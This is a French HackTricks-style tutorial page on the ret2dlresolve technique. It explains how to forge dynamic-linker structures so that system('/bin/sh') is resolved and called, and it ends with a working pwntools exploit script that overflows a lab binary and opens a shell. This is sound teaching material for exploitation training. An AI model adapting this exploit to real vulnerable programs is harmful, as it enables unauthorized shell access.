# Ret2dlresolve

{{#include ../../../banners/hacktricks-training.md}}

## Informations de base

Comme expliqué dans la page sur [**GOT/PLT**](../arbitrary-write-2-exec/aw2exec-got-plt.md) et [**Relro**](../common-binary-protections-and-bypasses/relro.md), les binaires sans Full Relro résolvent les symboles (comme les adresses vers des bibliothèques externes) la première fois qu'ils sont utilisés. Cette résolution se produit en appelant la fonction **`_dl_runtime_resolve`**.

La fonction **`_dl_runtime_resolve`** prend depuis la pile des références à certaines structures dont elle a besoin pour résoudre le symbole spécifié.

Par conséquent, il est possible de **falsifier toutes ces structures** pour faire en sorte que la résolution dynamique lie le symbole demandé (comme la fonction **`system`**) et l'appelle avec un paramètre configuré (par exemple, **`system('/bin/sh')`**).

En général, toutes ces structures sont falsifiées en créant une **chaîne ROP initiale qui appelle `read`** sur une mémoire écrivable, puis les **structures** et la chaîne **`'/bin/sh'`** sont passées pour être stockées par read à un emplacement connu, et ensuite la chaîne ROP continue en appelant **`_dl_runtime_resolve`** avec l'adresse de `$'/bin/sh'`.

> [!TIP]
> Cette technique est particulièrement utile s'il n'y a pas de gadgets syscall (pour utiliser des techniques telles que [**ret2syscall**](rop-syscall-execv.md) ou [SROP](srop-sigreturn-oriented-programming.md)) et qu'il n'y a pas de moyens de divulguer les adresses libc.

Vous pouvez trouver une meilleure explication de cette technique dans la seconde moitié de la vidéo :

{{#ref}}
https://youtu.be/ADULSwnQs-s?feature=shared
{{#endref}}

## Structures

Il est nécessaire de falsifier 3 structures : **`JMPREL`**, **`STRTAB`** et **`SYMTAB`**. Vous avez une meilleure explication sur la façon dont elles sont construites dans [https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve#structures](https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve#structures)

## Résumé de l'attaque

1. Écrire des structures fausses à un endroit
2. Définir le premier argument de system (`$rdi = &'/bin/sh'`)
3. Placer sur la pile les adresses des structures pour appeler **`_dl_runtime_resolve`**
4. **Appeler** `_dl_runtime_resolve`
5. **`system`** sera résolu et appelé avec `'/bin/sh'` comme argument

## Exemple

Vous pouvez trouver un [**exemple de cette technique ici**](https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve/exploitation) **contenant une très bonne explication de la chaîne ROP finale**, mais voici l'exploit final utilisé :
```python
from pwn import *

elf = context.binary = ELF('./vuln', checksec=False)
p = elf.process()
rop = ROP(elf)

# create the dlresolve object
dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])

rop.raw('A' * 76)
rop.read(0, dlresolve.data_addr) # read to where we want to write the fake structures
rop.ret2dlresolve(dlresolve)     # call .plt and dl-resolve() with the correct, calculated reloc_offset

log.info(rop.dump())

p.sendline(rop.chain())
p.sendline(dlresolve.payload)    # now the read is called and we pass all the relevant structures in

p.interactive()
```
## Références

- [https://youtu.be/ADULSwnQs-s](https://youtu.be/ADULSwnQs-s?feature=shared)
- [https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve](https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve)

{{#include ../../../banners/hacktricks-training.md}}
